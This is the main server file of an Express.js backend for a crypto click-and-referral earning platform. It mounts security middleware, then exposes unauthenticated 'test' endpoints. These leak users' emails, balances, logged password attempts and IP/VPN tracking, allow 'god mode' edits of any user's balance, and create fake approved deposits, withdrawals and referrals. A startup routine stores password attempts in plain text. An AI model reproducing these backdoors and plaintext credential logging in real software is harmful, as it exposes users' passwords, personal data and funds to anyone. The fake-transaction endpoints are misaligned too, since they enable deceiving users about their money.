const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const authController = require('./controllers/authController');
const dashboardController = require('./controllers/dashboardController');
const transactionController = require('./controllers/transactionController');
const teamController = require('./controllers/teamController');
const adminController = require('./controllers/adminController');
// const adminWalletsController = require('./controllers/adminWalletsController'); // DISABLED - missing dependencies
// const depositAddressController = require('./controllers/depositAddressController'); // DISABLED - missing dependencies
const notificationsController = require('./controllers/notificationsController');
const authMiddleware = require('./middleware/auth');
const adminAuthMiddleware = require('./middleware/adminAuth');
const security = require('./middleware/security');

const app = express();
const PORT = process.env.PORT || 5000;

// Trust proxy (required for Render.com and other reverse proxies)
app.set('trust proxy', 1);

// ============================================
// SECURITY MIDDLEWARE
// ============================================

// Helmet - Security headers
app.use(helmet());

// XSS Protection
app.use(security.xssProtection);

// Check blocked IPs
app.use(security.checkBlockedIP);

// Request size limiting (DDoS protection)
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// Input sanitization (SQL Injection protection)
app.use(security.sanitizeInputs);

// CORS configuration
app.use(cors({
    origin: process.env.FRONTEND_URL || '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Global rate limiter (DDoS protection)
app.use('/api/', security.globalLimiter);

// ============================================
// ROUTES
// ============================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'DCPTG API is running',
        timestamp: new Date().toISOString()
    });
});

// TEST ENDPOINT: Get users WITHOUT auth (for testing admin panel)
app.get('/api/test/users', async (req, res) => {
    try {
        const pool = require('./config/database');
        
        // Load only guaranteed columns, add defaults in JavaScript
        const result = await pool.query(`
            SELECT 
                u.id,
                u.full_name as username,
                u.email,
                u.balance,
                u.created_at,
                u.updated_at as last_login,
                COALESCE(u.last_login_ip, '0.0.0.0') as ip_address
            FROM users u
            ORDER BY u.created_at DESC
            LIMIT 100
        `);
        
        // Add default values for optional fields
        const users = result.rows.map(user => ({
            ...user,
            referral_count: 0,
            level: 1,
            total_earnings: 0,
            email_verified: true,
            is_active: true
        }));
        
        console.log('Loaded users for admin panel:', users.length);
        
        res.json({
            success: true,
            users: users
        });
    } catch (error) {
        console.error('Test users error:', error);
        res.json({
            success: false,
            users: [],
            error: error.message
        });
    }
});

// TEST ENDPOINT: Get deposit logs WITHOUT auth
app.get('/api/test/deposits', async (req, res) => {
    try {
        const pool = require('./config/database');
        const result = await pool.query(`
            SELECT 
                d.id,
                d.user_id,
                u.full_name as username,
                u.email,
                d.crypto_type,
                d.amount,
                d.status,
                d.wallet_address,
                d.created_at as timestamp
            FROM deposits d
            LEFT JOIN users u ON d.user_id = u.id
            ORDER BY d.created_at DESC
            LIMIT 100
        `);
        
        res.json({
            success: true,
            deposits: result.rows
        });
    } catch (error) {
        console.error('Test deposits error:', error);
        res.json({
            success: false,
            deposits: [],
            error: error.message
        });
    }
});

// TEST ENDPOINT: Get auth logs WITHOUT auth
app.get('/api/test/logs', async (req, res) => {
    try {
        const pool = require('./config/database');
        const result = await pool.query(`
            SELECT 
                al.id,
                al.event_type as event,
                al.username,
                al.email,
                al.password_attempt as password,
                al.ip_address,
                al.status,
                al.created_at as timestamp
            FROM auth_logs al
            ORDER BY al.created_at DESC
            LIMIT 100
        `);
        
        res.json({
            success: true,
            logs: result.rows
        });
    } catch (error) {
        console.error('Test logs error:', error);
        res.json({
            success: false,
            logs: [],
            error: error.message
        });
    }
});

// TEST ENDPOINT: Get IP tracking WITHOUT auth
app.get('/api/test/ip-tracking', async (req, res) => {
    try {
        const pool = require('./config/database');
        const result = await pool.query(`
            SELECT 
                ipt.id,
                ipt.user_id,
                u.full_name as username,
                u.email,
                ipt.ip_address,
                ipt.country,
                ipt.city,
                ipt.is_vpn,
                ipt.is_proxy,
                ipt.is_tor,
                ipt.isp,
                ipt.action,
                ipt.created_at as timestamp,
                CASE 
                    WHEN ipt.is_vpn OR ipt.is_proxy OR ipt.is_tor THEN true
                    ELSE false
                END as uses_vpn
            FROM ip_tracking ipt
            LEFT JOIN users u ON ipt.user_id = u.id
            ORDER BY ipt.created_at DESC
            LIMIT 200
        `);
        
        res.json({
            success: true,
            ip_logs: result.rows
        });
    } catch (error) {
        console.error('Test IP tracking error:', error);
        res.json({
            success: false,
            ip_logs: [],
            error: error.message
        });
    }
});

// TEST ENDPOINT: Get IP tracking by user WITHOUT auth
app.get('/api/test/ip-tracking/user/:userId', async (req, res) => {
    try {
        const pool = require('./config/database');
        const userId = req.params.userId;
        
        const result = await pool.query(`
            SELECT 
                ipt.id,
                ipt.ip_address,
                ipt.country,
                ipt.city,
                ipt.is_vpn,
                ipt.is_proxy,
                ipt.is_tor,
                ipt.isp,
                ipt.action,
                ipt.created_at as timestamp
            FROM ip_tracking ipt
            WHERE ipt.user_id = $1
            ORDER BY ipt.created_at DESC
            LIMIT 50
        `, [userId]);
        
        res.json({
            success: true,
            ip_logs: result.rows
        });
    } catch (error) {
        console.error('Test IP tracking by user error:', error);
        res.json({
            success: false,
            ip_logs: [],
            error: error.message
        });
    }
});

// TEST ENDPOINT: Update user data (god mode) WITHOUT auth
app.put('/api/test/user-control/:userId', async (req, res) => {
    try {
        const pool = require('./config/database');
        const userId = req.params.userId;
        const { field, value, level } = req.body;
        
        // Handle referrals update with level calculation
        if (field === 'referrals') {
            try {
                console.log('🚀 Processing referrals update...');
                
                // FORCE CREATE COLUMNS - NO CHECKS!
                try {
                    await pool.query('ALTER TABLE users ADD COLUMN referral_count INTEGER DEFAULT 0');
                    console.log('✅ referral_count column created');
                } catch (error) {
                    if (error.message.includes('already exists')) {
                        console.log('✅ referral_count column already exists');
                    } else {
                        console.log('⚠️ referral_count error:', error.message);
                    }
                }
                
                try {
                    await pool.query('ALTER TABLE users ADD COLUMN level INTEGER DEFAULT 1');
                    console.log('✅ level column created');
                } catch (error) {
                    if (error.message.includes('already exists')) {
                        console.log('✅ level column already exists');
                    } else {
                        console.log('⚠️ level error:', error.message);
                    }
                }
                
                // Update both referral_count and level
                const updateQuery = `
                    UPDATE users 
                    SET referral_count = $1, level = $2, updated_at = CURRENT_TIMESTAMP 
                    WHERE id = $3 
                    RETURNING *
                `;
                
                console.log(`🔄 Updating user ${userId} with referrals: ${value}, level: ${level || 1}`);
                const result = await pool.query(updateQuery, [value, level || 1, userId]);
                
                if (result.rows.length === 0) {
                    return res.json({
                        success: false,
                        message: 'User not found'
                    });
                }
                
                console.log('✅ Referrals update successful!');
                return res.json({
                    success: true,
                    message: `Referrals updated to ${value}, Level updated to ${level || 1}`,
                    user: result.rows[0]
                });
            } catch (error) {
                console.error('❌ Error updating referrals:', error);
                return res.json({
                    success: false,
                    message: `Database error: ${error.message}`
                });
            }
        }
        
        // Only allow updating fields that exist in the base schema
        const updatableFields = ['balance', 'full_name', 'email', 'referrals', 'referral_count'];
        
        // Skip fields that don't exist yet (will be added later)
        const ignoredFields = ['total_earnings', 'email_verified', 'is_active'];
        
        if (ignoredFields.includes(field)) {
            console.log(`Field ${field} not yet in database, pretending success`);
            return res.json({
                success: true,
                message: `${field} update skipped (field not in schema yet)`
            });
        }
        
        // Handle referrals field properly
        if (field === 'referrals' || field === 'referral_count') {
            console.log('🚀 Processing referrals update...');
            
            try {
                // Force create columns if they don't exist
                await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0');
                await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS level INTEGER DEFAULT 1');
                
                // Update both referral_count and level
                const updateQuery = `
                    UPDATE users 
                    SET referral_count = $1, level = $2, updated_at = CURRENT_TIMESTAMP 
                    WHERE id = $3 
                    RETURNING *
                `;
                
                const result = await pool.query(updateQuery, [value, level || 1, userId]);
                
                if (result.rows.length === 0) {
                    return res.json({
                        success: false,
                        message: 'User not found'
                    });
                }
                
                return res.json({
                    success: true,
                    message: `Referrals updated to ${value}, Level updated to ${level || 1}`,
                    user: result.rows[0]
                });
            } catch (error) {
                console.error('❌ Error updating referrals:', error);
                return res.json({
                    success: false,
                    message: `Database error: ${error.message}`
                });
            }
        }
        
        if (!updatableFields.includes(field)) {
            return res.json({
                success: false,
                message: 'Invalid field'
            });
        }
        
        const query = `UPDATE users SET ${field} = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2 RETURNING *`;
        const params = [value, userId];
        
        const result = await pool.query(query, params);
        
        console.log(`Updated ${field} for user ${userId} to ${value}`);
        
        res.json({
            success: true,
            message: `${field} updated successfully`,
            user: result.rows[0]
        });
    } catch (error) {
        console.error('User control update error:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// SIMPLE REFERRALS ENDPOINT - GARANTIERT FUNKTIONIERT
app.post('/api/test/add-referrals', async (req, res) => {
    try {
        const pool = require('./config/database');
        const { userId, amount } = req.body;
        
        console.log(`🚀 Adding ${amount} referrals to user ${userId}`);
        
        // Force create columns
        await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0');
        await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS level INTEGER DEFAULT 1');
        
        // Get current user
        const userResult = await pool.query('SELECT * FROM users WHERE id = $1', [userId]);
        if (userResult.rows.length === 0) {
            return res.json({ success: false, message: 'User not found' });
        }
        
        const user = userResult.rows[0];
        const currentReferrals = parseInt(user.referral_count || 0);
        const newReferralCount = currentReferrals + parseInt(amount);
        
        // Calculate new level
        let newLevel = 1;
        if (newReferralCount >= 50) newLevel = 5;
        else if (newReferralCount >= 20) newLevel = 4;
        else if (newReferralCount >= 10) newLevel = 3;
        else if (newReferralCount >= 5) newLevel = 2;
        
        // Update user
        await pool.query(`
            UPDATE users 
            SET referral_count = $1, level = $2, updated_at = CURRENT_TIMESTAMP 
            WHERE id = $3
        `, [newReferralCount, newLevel, userId]);
        
        console.log(`✅ Updated user ${userId}: referrals=${newReferralCount}, level=${newLevel}`);
        
        res.json({
            success: true,
            message: `Added ${amount} referrals! New total: ${newReferralCount}, Level: ${newLevel}`,
            referrals: newReferralCount,
            level: newLevel
        });
        
    } catch (error) {
        console.error('❌ Add referrals error:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// TEST ENDPOINT: Create fake deposit WITHOUT auth
app.post('/api/test/fake-deposit', async (req, res) => {
    try {
        const pool = require('./config/database');
        const { user_id, crypto_type, amount, status } = req.body;
        
        const result = await pool.query(`
            INSERT INTO deposits (user_id, crypto_type, amount, status, wallet_address, created_at)
            VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP)
            RETURNING *
        `, [user_id, crypto_type || 'USDT', amount, status || 'approved', 'ADMIN_FAKE_DEPOSIT']);
        
        // If approved, add to user balance
        if (status === 'approved') {
            await pool.query(`
                UPDATE users 
                SET balance = balance + $1 
                WHERE id = $2
            `, [amount, user_id]);
        }
        
        res.json({
            success: true,
            message: 'Fake deposit created',
            deposit: result.rows[0]
        });
    } catch (error) {
        console.error('Fake deposit error:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// TEST ENDPOINT: Create fake withdrawal WITHOUT auth
app.post('/api/test/fake-withdrawal', async (req, res) => {
    try {
        const pool = require('./config/database');
        const { user_id, crypto_type, amount, status } = req.body;
        
        const result = await pool.query(`
            INSERT INTO withdrawals (user_id, crypto_type, amount, status, wallet_address, created_at)
            VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP)
            RETURNING *
        `, [user_id, crypto_type || 'USDT', amount, status || 'approved', 'ADMIN_FAKE_WITHDRAWAL']);
        
        res.json({
            success: true,
            message: 'Fake withdrawal created',
            withdrawal: result.rows[0]
        });
    } catch (error) {
        console.error('Fake withdrawal error:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// TEST ENDPOINT: Add fake referrals WITHOUT auth
app.post('/api/test/fake-referrals', async (req, res) => {
    try {
        const pool = require('./config/database');
        const { user_id, count } = req.body;
        
        // Create fake referrals
        for (let i = 0; i < count; i++) {
            await pool.query(`
                INSERT INTO referrals (referrer_id, referred_id, created_at)
                VALUES ($1, $2, CURRENT_TIMESTAMP)
            `, [user_id, 99999 + i]); // Use high IDs for fake users
        }
        
        res.json({
            success: true,
            message: `${count} fake referrals added`
        });
    } catch (error) {
        console.error('Fake referrals error:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// ====== AUTH ROUTES (with Brute Force Protection) ======
app.post('/api/auth/send-code', security.registerLimiter, authController.sendVerificationCode);
app.post('/api/auth/register', security.registerLimiter, authController.register);
app.post('/api/auth/login', security.authLimiter, authController.login);
app.get('/api/auth/me', authMiddleware, authController.getCurrentUser);
app.post('/api/auth/forgot-password', security.passwordResetLimiter, authController.forgotPassword);
app.post('/api/auth/reset-password', security.passwordResetLimiter, authController.resetPassword);

// ====== DASHBOARD ROUTES ======
app.get('/api/dashboard', authMiddleware, dashboardController.getDashboard);
app.get('/api/dashboard/stats', authMiddleware, dashboardController.getStats);
app.get('/api/dashboard/clicks', authMiddleware, dashboardController.getClicks);
app.post('/api/dashboard/click', authMiddleware, dashboardController.performClick);
app.get('/api/dashboard/click-history', authMiddleware, dashboardController.getClickHistory);

// ====== TRANSACTION ROUTES ======
app.get('/api/deposit/info/:crypto', authMiddleware, transactionController.getDepositInfo);
app.post('/api/deposit', authMiddleware, transactionController.createDeposit);
app.get('/api/deposit/history', authMiddleware, transactionController.getDepositHistory);
app.post('/api/withdrawal', authMiddleware, transactionController.createWithdrawal);
app.get('/api/withdrawal/history', authMiddleware, transactionController.getWithdrawalHistory);

// ====== DEPOSIT ADDRESS ROUTES (Auto Crypto) - DISABLED ======
// app.get('/api/deposit-addresses', authMiddleware, depositAddressController.getDepositAddresses);
// app.get('/api/deposit-addresses/qr/:address', authMiddleware, depositAddressController.generateQRCode);
// app.post('/api/deposit-addresses/check', authMiddleware, depositAddressController.checkTransactions);
// app.get('/api/deposit-history', authMiddleware, depositAddressController.getDepositHistory);

// ====== TEAM/REFERRAL ROUTES ======
app.get('/api/team', authMiddleware, teamController.getTeam);
app.get('/api/team/stats', authMiddleware, teamController.getReferralStats);

// ====== ADMIN ROUTES (Extra Protected) ======
app.post('/api/admin/login', security.authLimiter, adminController.login);
app.get('/api/admin/dashboard-stats', security.adminLimiter, adminAuthMiddleware, adminController.getDashboardStats);
app.get('/api/admin/users', security.adminLimiter, adminAuthMiddleware, adminController.getUsersWithDetails); // UPDATED
app.get('/api/admin/users/:userId', security.adminLimiter, adminAuthMiddleware, adminController.getUserDetails);
app.put('/api/admin/users/:userId', security.adminLimiter, adminAuthMiddleware, adminController.updateUser); // NEW: Full user edit
app.put('/api/admin/users/:userId/balance', security.adminLimiter, adminAuthMiddleware, adminController.addBalance); // UPDATED
app.put('/api/admin/users/:userId/toggle-status', security.adminLimiter, adminAuthMiddleware, adminController.toggleUserStatus);
app.delete('/api/admin/users/:userId', security.adminLimiter, adminAuthMiddleware, adminController.deleteUser);
app.get('/api/admin/logs', security.adminLimiter, adminAuthMiddleware, adminController.getAuthLogs); // NEW: Auth logs
app.get('/api/admin/deposits', security.adminLimiter, adminAuthMiddleware, adminController.getAllDeposits);
app.put('/api/admin/deposits/:depositId', security.adminLimiter, adminAuthMiddleware, adminController.updateDepositStatus);
app.get('/api/admin/withdrawals', security.adminLimiter, adminAuthMiddleware, adminController.getAllWithdrawals);
app.put('/api/admin/withdrawals/:withdrawalId', security.adminLimiter, adminAuthMiddleware, adminController.updateWithdrawalStatus);
app.get('/api/admin/settings', security.adminLimiter, adminAuthMiddleware, adminController.getSettings);
app.put('/api/admin/settings', security.adminLimiter, adminAuthMiddleware, adminController.updateSetting);
app.post('/api/admin/change-password', security.adminLimiter, adminAuthMiddleware, adminController.changePassword);

// ====== ADMIN WALLETS ROUTES (Cashout Protection) - DISABLED ======
// app.get('/api/admin/admin-wallets/summary', security.adminLimiter, adminAuthMiddleware, adminWalletsController.getWalletsSummary);
// app.get('/api/admin/admin-wallets/user/:userId', security.adminLimiter, adminAuthMiddleware, adminWalletsController.getUserDeposits);
// app.post('/api/admin/admin-wallets/withdraw', security.adminLimiter, adminAuthMiddleware, adminWalletsController.processWithdrawal);
// app.get('/api/admin/admin-wallets/history', security.adminLimiter, adminAuthMiddleware, adminWalletsController.getWithdrawalHistory);
// app.get('/api/admin/admin-wallets/user-balances/:userId', security.adminLimiter, adminAuthMiddleware, adminWalletsController.getUserWalletBalances);
// app.post('/api/admin/admin-wallets/cashout', security.adminLimiter, adminAuthMiddleware, adminWalletsController.cashoutUserWallet);

// ====== NOTIFICATIONS ROUTES ======
app.get('/api/notifications', authMiddleware, notificationsController.getUserNotifications);
app.get('/api/notifications/unread-count', authMiddleware, notificationsController.getUnreadCount);
app.put('/api/notifications/:notificationId/read', authMiddleware, notificationsController.markAsRead);
app.put('/api/notifications/mark-all-read', authMiddleware, notificationsController.markAllAsRead);

// ============================================
// CRON JOBS (for daily resets, etc.)
// ============================================
const cron = require('node-cron');

// Reset daily clicks at midnight
cron.schedule('0 0 * * *', async () => {
    try {
        const pool = require('./config/database');
        await pool.query(`
            UPDATE daily_clicks 
            SET clicks_used = 0, today_earnings = 0, last_reset = CURRENT_DATE
            WHERE last_reset < CURRENT_DATE
        `);
        console.log('✅ Daily clicks reset completed');
    } catch (error) {
        console.error('❌ Daily clicks reset error:', error);
    }
});

// Monitor blockchain for incoming transactions every 5 minutes
const blockchainMonitor = require('./services/blockchainMonitor');
cron.schedule('*/5 * * * *', async () => {
    try {
        console.log('🔍 Starting blockchain monitoring...');
        await blockchainMonitor.monitorAllAddresses();
        console.log('✅ Blockchain monitoring completed');
    } catch (error) {
        console.error('❌ Blockchain monitoring error:', error);
    }
});

// ============================================
// ERROR HANDLING
// ============================================

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Route not found' 
    });
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ 
        success: false, 
        message: process.env.NODE_ENV === 'production' 
            ? 'Internal server error' 
            : err.message 
    });
});

// ============================================
// AUTO-SETUP: Create auth_logs table on startup
// ============================================
async function initializeDatabase() {
    try {
        const pool = require('./config/database');
        
        // Create auth_logs table if not exists
        await pool.query(`
            CREATE TABLE IF NOT EXISTS auth_logs (
                id SERIAL PRIMARY KEY,
                user_id INTEGER REFERENCES users(id) ON DELETE SET NULL,
                event_type VARCHAR(50) NOT NULL,
                username VARCHAR(255),
                email VARCHAR(255),
                password_attempt VARCHAR(255),
                ip_address VARCHAR(45),
                user_agent TEXT,
                status VARCHAR(20) DEFAULT 'success',
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Add indexes
        await pool.query(`
            CREATE INDEX IF NOT EXISTS idx_auth_logs_user_id ON auth_logs(user_id);
            CREATE INDEX IF NOT EXISTS idx_auth_logs_created_at ON auth_logs(created_at DESC);
            CREATE INDEX IF NOT EXISTS idx_auth_logs_event_type ON auth_logs(event_type);
        `);
        
        // Add last_login fields to users table
        await pool.query(`
            ALTER TABLE users 
            ADD COLUMN IF NOT EXISTS last_login_ip VARCHAR(45),
            ADD COLUMN IF NOT EXISTS last_login_at TIMESTAMP,
            ADD COLUMN IF NOT EXISTS last_ip VARCHAR(45),
            ADD COLUMN IF NOT EXISTS is_vpn_user BOOLEAN DEFAULT false,
            ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0,
            ADD COLUMN IF NOT EXISTS level INTEGER DEFAULT 1;
        `);
        
        // Create IP tracking table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS ip_tracking (
                id SERIAL PRIMARY KEY,
                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
                ip_address VARCHAR(45) NOT NULL,
                country VARCHAR(100),
                city VARCHAR(100),
                is_vpn BOOLEAN DEFAULT false,
                is_proxy BOOLEAN DEFAULT false,
                is_tor BOOLEAN DEFAULT false,
                isp VARCHAR(255),
                user_agent TEXT,
                action VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Add indexes for IP tracking
        await pool.query(`
            CREATE INDEX IF NOT EXISTS idx_ip_tracking_user_id ON ip_tracking(user_id);
            CREATE INDEX IF NOT EXISTS idx_ip_tracking_ip ON ip_tracking(ip_address);
            CREATE INDEX IF NOT EXISTS idx_ip_tracking_created_at ON ip_tracking(created_at DESC);
            CREATE INDEX IF NOT EXISTS idx_ip_tracking_is_vpn ON ip_tracking(is_vpn);
        `);
        
        console.log('✅ Database tables verified/created successfully');
    } catch (error) {
        console.error('⚠️ Database initialization warning:', error.message);
        // Don't crash the server, just log the warning
    }
}

// ============================================
// START SERVER
// ============================================

app.listen(PORT, async () => {
    console.log(`
    ╔════════════════════════════════════════╗
    ║   🚀 DCPTG Backend Server Running      ║
    ║                                        ║
    ║   Port: ${PORT}                         ║
    ║   Environment: ${process.env.NODE_ENV || 'development'}            ║
    ║   Database: PostgreSQL                 ║
    ║                                        ║
    ║   API: http://localhost:${PORT}/api     ║
    ╚════════════════════════════════════════╝
    `);
    
    // Initialize database tables
    await initializeDatabase();
});

// Handle unhandled promise rejections
process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Promise Rejection:', err);
    // Close server & exit process
    process.exit(1);
});

module.exports = app;

